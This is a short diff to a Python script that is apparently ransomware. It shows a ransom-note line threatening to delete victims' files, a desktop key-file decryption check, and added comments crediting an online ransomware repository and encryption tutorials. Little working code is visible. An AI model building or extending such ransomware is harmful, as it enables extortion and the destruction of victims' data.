@@ -134,7 +134,7 @@ Do NOT think that we wont delete your files altogether and throw away the key if
                 break
 
          # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
-         
+
     def put_me_on_desktop(self):
         # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
         # -the files
@@ -187,3 +187,5 @@ def main():
 main()
 
 # with help from "https://github.com/ncorbuk/Python-Ransomware/blob/master/RansomWare.py"
+# help from https://devqa.io/encrypt-decrypt-data-python/
+# help from https://www.thepythoncode.com/article/encrypt-decrypt-files-symmetric-python
